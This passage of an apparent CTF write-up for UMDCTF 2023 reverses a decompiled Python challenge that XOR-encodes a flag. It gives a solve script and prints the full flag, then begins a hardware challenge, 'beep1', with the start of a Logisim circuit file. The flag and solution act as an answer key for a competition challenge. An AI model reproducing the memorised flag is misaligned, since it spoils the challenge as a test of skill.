&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;lf &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span&gt;ls:
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;Your flag is correct!&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# None(&amp;#39;Some of your flag is correct...&amp;#39;)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Points I observed&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;The seed is 64&lt;&#x2F;li&gt;
&lt;li&gt;source values are known&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;c&lt;&#x2F;code&gt; is generated by XORing flag char with evil_bit_hack(wandom(wandom(w))) &amp;amp; evil_bit_hack(w) and 1 is added at the end.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;So, I just need to reverse this line &lt;code&gt; c = ~(~ord(flag[i - seed]) ^ evil_bit_hack(wandom(wandom(w))) &amp;amp; evil_bit_hack(w)) + 1&lt;&#x2F;code&gt; To print the flag.&lt;&#x2F;p&gt;
&lt;p&gt;Interesting, lets do it&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;res = (source[i-seed]-1)^ evil_bit_hack(wandom(wandom(w))) &amp;amp; evil_bit_hack(w)&lt;&#x2F;code&gt; Will be the reversed function.&lt;&#x2F;p&gt;
&lt;p&gt;And here is the solution script to print the flag.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# Source Generated with Decompyle++
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# File: chal.pyc (Python 3.10)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;math &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;sqrt&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;sin&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;cos
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;ctypes &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;c_uint32&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;c_float
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;sys &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;exit &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;as &lt;&#x2F;span&gt;&lt;span&gt;exit_
&lt;&#x2F;span&gt;&lt;span&gt;source &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;[
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;672662614&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;741343303&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;495239261&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;744259788&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;722021046&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xA70AA247&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1053692&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xA8050035&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xA982A820&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;624689&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xA90D20BC&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;41134&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;295340&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xA0028102&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;622681&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;576469&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;671170814&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x8041086E&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;765&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;680595550&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x80200166&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;698368102&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2437137&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x8042C1EE&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;570966112&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;4612341&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x800008D4&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xA94D02CE&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;16484&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2103301&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;136226&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;9438506&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;663820758&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x8013523B&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;8405532&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xA4000875&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x80030A78&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;136768&lt;&#x2F;span&gt;&lt;span&gt;]
&lt;&#x2F;span&gt;&lt;span&gt;seed &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;64
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;wandom&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;x&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;x &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;x &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;cos&lt;&#x2F;span&gt;&lt;span&gt;(x) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sin&lt;&#x2F;span&gt;&lt;span&gt;(x) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&#x2F; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1000
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;evil_bit_hack&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;y&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;(c_uint32&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from_buffer&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;c_float&lt;&#x2F;span&gt;&lt;span&gt;(y))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;value)
&lt;&#x2F;span&gt;&lt;span&gt;flag &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;38 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;A&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;lf &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;len&lt;&#x2F;span&gt;&lt;span&gt;(flag)
&lt;&#x2F;span&gt;&lt;span&gt;ls &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;len&lt;&#x2F;span&gt;&lt;span&gt;(source)
&lt;&#x2F;span&gt;&lt;span&gt;l &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;lf &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;lf &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span&gt;ls &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else &lt;&#x2F;span&gt;&lt;span&gt;ls
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(seed&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;seed &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;l):
&lt;&#x2F;span&gt;&lt;span&gt;    w &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;wandom&lt;&#x2F;span&gt;&lt;span&gt;(i)
&lt;&#x2F;span&gt;&lt;span&gt;    x &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;evil_bit_hack&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;wandom&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;wandom&lt;&#x2F;span&gt;&lt;span&gt;(w))) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;amp; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;evil_bit_hack&lt;&#x2F;span&gt;&lt;span&gt;(w)
&lt;&#x2F;span&gt;&lt;span&gt;    c &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= ~&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;ord&lt;&#x2F;span&gt;&lt;span&gt;(flag[i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span&gt;seed]) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;evil_bit_hack&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;wandom&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;wandom&lt;&#x2F;span&gt;&lt;span&gt;(w))) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;amp; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;evil_bit_hack&lt;&#x2F;span&gt;&lt;span&gt;(w)) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;span&gt;    res &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;(source[i&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;seed]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span&gt;x
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;chr&lt;&#x2F;span&gt;&lt;span&gt;(res)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;end&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;#UMDCTF{0_0+-+eXP-eLLiARm_us_!!!-12345}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : UMDCTF{0_0+-+eXP-eLLiARm_us_!!!-12345}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;hr &#x2F;&gt;
&lt;h1 id=&quot;hardware&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#hardware&quot; aria-label=&quot;Anchor link for: hardware&quot;&gt;Hardware&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;h1 id=&quot;beep1&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#beep1&quot; aria-label=&quot;Anchor link for: beep1&quot;&gt;beep1&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;umd23&#x2F;umdctf23_beep1.png&quot; alt=&quot;beep&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The attached files are &lt;a&gt;Beep1.circ&lt;&#x2F;a&gt; which is a xml file and a &lt;a&gt;flag.enc&lt;&#x2F;a&gt; file.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Beep1.circ&lt;&#x2F;strong&gt; is&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;xml&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-xml &quot;&gt;&lt;code class=&quot;language-xml&quot; data-lang=&quot;xml&quot;&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;?&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;xml &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;version&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;1.0&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encoding&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;UTF-8&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;standalone&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;no&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;?&amp;gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;project &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;source&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;3.8.0&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;version&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;1.0&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;  This file is intended to be loaded by Logisim-evolution v3.8.0(https:&#x2F;&#x2F;github.com&#x2F;logisim-evolution&#x2F;).
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;lib &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;desc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;#Wiring&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;0&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;tool &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Pin&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;appearance&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;val&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;classic&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;tool&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;lib&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;gt;
